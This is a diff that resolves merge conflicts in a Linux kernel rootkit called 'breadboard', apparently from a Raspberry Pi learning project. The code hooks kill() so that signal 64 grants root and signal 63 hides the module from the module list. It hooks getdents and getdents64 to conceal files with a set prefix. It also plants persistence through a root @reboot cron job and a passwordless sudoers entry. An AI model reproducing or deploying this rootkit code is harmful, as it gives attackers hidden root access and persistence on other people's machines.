@@ -1,10 +1,7 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/init.h>
-<<<<<<< HEAD
 #include <linux/gpio.h>
-=======
->>>>>>> master
 #include <linux/kallsyms.h>
 #include <linux/syscalls.h>
 #include <linux/version.h>
@@ -12,30 +9,18 @@
 
 #include "breadboardhelper.h"
 
-<<<<<<< HEAD
-#define BASE_DIR "/home/pi/Documents/Github/LinuxKernelDevelopment/"
-=======
 #define USER_NAME 
 #define BASE_DIR "/home/" USER_NAME "/Documents/Github/LinuxKernelDevelopment/"
->>>>>>> master
 #define CRON_JOB_PATH "/etc/cron.d/breadboard"
 #define SUDO_JOB_PATH "/etc/sudoers.d/breadboard"
 #define MODULE_PATH BASE_DIR "load_mod.sh"
 #define CRON_CONTENT "@reboot root " MODULE_PATH "\n"
-<<<<<<< HEAD
 #define SUDO_CONTENT "pi ALL=(ALL) NOPASSWD: " MODULE_PATH "\n"
-//#define GPIO_LED 592
 #define PREFIX "breadboard"
-//#define GPIO_BUTTON 591
-//#define GPIO_BUTTON_IRQ (IRQF_TRIGGER_FALLING | IRQF_SHARED)
-
-bool mod_hidden = false;
-=======
-#define SUDO_CONTENT USER_NAME "ALL=(ALL) NOPASSWD: " MODULE_PATH "\n"
+#define SUDO_CONTENT USER_NAME " ALL=(ALL) NOPASSWD: " MODULE_PATH "\n"
 #define PREFIX "breadboard"
 
 static short mod_hidden = 0;
->>>>>>> master
 static struct list_head *prev_module;
 
 static asmlinkage long(*orig_kill)(const struct pt_regs *);
@@ -43,39 +28,22 @@ static asmlinkage long(*orig_getdents64)(const struct pt_regs *);
 static asmlinkage long(*orig_getdents)(const struct pt_regs *);
 
 asmlinkage int hook_kill(const struct pt_regs *regs){
-<<<<<<< HEAD
-=======
-	// kill -[32->64] is custom and system dependant
->>>>>>> master
 	void set_root(void);
 	void hide_module(void);
 	void show_module(void);
 	int sig = regs->si;
-<<<<<<< HEAD
-	if (sig == 64){
-=======
 	if ( sig == 64 ){
->>>>>>> master
 		printk(KERN_INFO "breadboard: giving root\n");
 		set_root();
 		return 0;
 	}
-<<<<<<< HEAD
-	if (sig == 63){
-		if(!mod_hidden){
-=======
 	if ( sig == 63 ){
 		if( mod_hidden == 0 ){
->>>>>>> master
 			printk(KERN_INFO "breadboard: hiding\n");
 			hide_module();
 			return 0;
 		}
-<<<<<<< HEAD
-		else if (mod_hidden){
-=======
 		else if ( mod_hidden == 1 ){
->>>>>>> master
 			printk(KERN_INFO "breadboard: showed\n");
 			show_module();
 			return 0;
@@ -84,7 +52,6 @@ asmlinkage int hook_kill(const struct pt_regs *regs){
 	return orig_kill(regs);
 }
 asmlinkage int hook_getdents64(const struct pt_regs *regs){
-<<<<<<< HEAD
 	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
 	struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
 	unsigned long offset = 0;
@@ -109,7 +76,6 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs){
 			previous_dir->d_reclen += current_dir->d_reclen;
 		}
 		else{
-=======
 	printk(KERN_INFO "Hooking getdents64\n");
 	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
 	struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
@@ -144,24 +110,14 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs){
 			}
 		}
 		else {
->>>>>>> master
 			previous_dir = current_dir;
 		}
 		offset += current_dir->d_reclen;
 	}
-<<<<<<< HEAD
 	error = copy_to_user(dirent, dirent_ker, ret);
 	if (error)
 		goto done;
 done:
-=======
-
-	error = copy_to_user(dirent, dirent_ker, ret);
-	if (error){
-		kfree(dirent_ker);
-		return -EFAULT;
-	}
->>>>>>> master
 	kfree(dirent_ker);
 	return ret;
 }
@@ -176,7 +132,6 @@ asmlinkage int hook_getdents(const struct pt_regs *regs){
 	struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
 	unsigned long offset = 0;
 	int ret = orig_getdents(regs);
-<<<<<<< HEAD
 	dirent_ker = kzalloc(ret, GFP_KERNEL);
 
 	if ( (ret <=0) || (dirent_ker == NULL) )
@@ -189,7 +144,6 @@ asmlinkage int hook_getdents(const struct pt_regs *regs){
 	while (offset<ret){
 		current_dir = (void *)dirent_ker + offset;
 		if(memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0){
-=======
 	if (ret <= 0)
 		return ret;
 	dirent_ker = kzalloc(ret, GFP_KERNEL);
@@ -206,19 +160,12 @@ asmlinkage int hook_getdents(const struct pt_regs *regs){
 		if(current_dir->d_name &&
 			memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0){
 
->>>>>>> master
 			if(current_dir == dirent_ker){
 				ret -= current_dir->d_reclen;
 				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
 				continue;
 			}
-<<<<<<< HEAD
 			previous_dir->d_reclen += current_dir->d_reclen;
-=======
-			if(previous_dir){
-				previous_dir->d_reclen += current_dir->d_reclen;
-			}
->>>>>>> master
 		}
 		else{
 			previous_dir = current_dir;
@@ -226,16 +173,9 @@ asmlinkage int hook_getdents(const struct pt_regs *regs){
 		offset += current_dir->d_reclen;
 	}
 	error = copy_to_user(dirent, dirent_ker, ret);
-<<<<<<< HEAD
 	if (error)
 		goto done;
 done:
-=======
-	if (error){
-		kfree(dirent_ker);
-		return -EFAULT;
-	}
->>>>>>> master
 	kfree(dirent_ker);
 	return ret;
 }
@@ -364,20 +304,12 @@ static int privledge_removal(void){
 void hide_module(void){
 	prev_module = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
-<<<<<<< HEAD
-	mod_hidden = true;
-=======
 	mod_hidden = 1;
->>>>>>> master
 }
 
 void show_module(void){
 	list_add(&THIS_MODULE->list, prev_module);
-<<<<<<< HEAD
-	mod_hidden = false;
-=======
 	mod_hidden = 0;
->>>>>>> master
 }
 
 static struct ftrace_hook hooks[] = {
@@ -387,19 +319,12 @@ static struct ftrace_hook hooks[] = {
 };
 
 static int __init breadboard_init(void){
-<<<<<<< HEAD
-	int ret, led, button;
-=======
 	int ret;
->>>>>>> master
 	ret = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 	if (ret)
 		return ret;
 	printk(KERN_INFO "Hooks loaded.\n");
-<<<<<<< HEAD
-=======
 	/*
->>>>>>> master
 	hide_module();
 	ret = persistence();
 	if (ret<0) {
@@ -411,8 +336,6 @@ static int __init breadboard_init(void){
 		pr_err("Privledge failed\n");
 		return ret;
 	}
-<<<<<<< HEAD
-	/*
 	printk(KERN_INFO "GPIO_LED: Initializing the GPIO_LED module\n");
 
 	led = gpio_request(GPIO_LED, "led-gpio");
@@ -428,8 +351,6 @@ static int __init breadboard_init(void){
 	}
 	gpio_set_value(GPIO_LED, 1);
 	printk(KERN_INFO "GPIO_LED: LED turned on\n");
-=======
->>>>>>> master
 	*/
 	return 0;  // Success
 }
@@ -437,20 +358,14 @@ static int __init breadboard_init(void){
 static void __exit breadboard_exit(void){
 	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 	printk(KERN_INFO "Hooks unloaded\n");
-<<<<<<< HEAD
-	show_module();
-	persistence_removal();
-	privledge_removal();
 	/*
 	gpio_set_value(GPIO_LED, 0);
 	gpio_free(GPIO_LED);
 	*/
 	//gpio_free(GPIO_BUTTON);
-=======
 	//show_module();
 	//persistence_removal();
 	//privledge_removal();
->>>>>>> master
 }
 
 module_init(breadboard_init);
